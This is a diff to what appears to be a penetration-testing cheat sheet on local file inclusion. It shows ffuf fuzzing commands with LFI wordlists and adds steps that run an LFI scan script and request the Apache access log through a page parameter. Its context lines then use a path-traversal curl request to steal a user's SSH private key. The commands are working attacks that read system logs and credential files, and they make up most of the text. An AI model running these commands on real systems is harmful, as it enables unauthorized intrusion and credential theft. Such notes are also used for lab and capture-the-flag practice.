@@ -61,7 +61,18 @@ ffuf -u http://$target:8080/search?FUZZ=firefire -w /usr/share/wordlists/dirb/bi
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<TARGET_IP>/index.php?file=FUZZ
 ffuf -u http://$target/directory/index.php?page=FUZZ
 ```
-
+### LFI script
+```
+chmod +x lfi_scan.sh
+```
+```
+./lfi_scan.sh http:/$target/index.php
+```
+Then check it with curl
+```
+curl "http://target/index.php?page=/var/log/apache2/access.log"
+```
+### Ways to get ssh
 To get the ssh keys:
 ```
 curl http://$target/something/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
